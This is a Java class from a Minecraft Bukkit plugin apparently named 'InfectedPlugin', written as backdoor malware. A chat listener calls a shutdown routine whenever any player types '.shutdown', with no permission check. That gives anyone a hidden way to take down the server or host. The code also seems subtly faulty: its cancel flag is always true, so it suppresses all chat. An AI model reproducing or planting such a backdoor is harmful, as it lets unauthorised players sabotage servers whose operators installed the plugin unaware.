 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import java.io.IOException;
 import java.util.logging.Logger;
 
 import org.bukkit.Bukkit;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.CreeperCoders.InfectedPlugin.IP_Util;
 
 public class Command_shutdown implements Listener
 {
     public final Logger log = Bukkit.getLogger();
 
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".shutdown"))
         {
             try
             {
                 IP_Util.shutdown();
             }
             catch (IOException ex)
             {
                 log.severe(ex.getMessage());
             }
             catch (RuntimeException ex)
             {
                 log.severe(ex.getMessage());
             }
             cancel = true;
         }
         
         if (cancel)
         {
            event.setCancelled(true);
            return;
         }
     }
 }
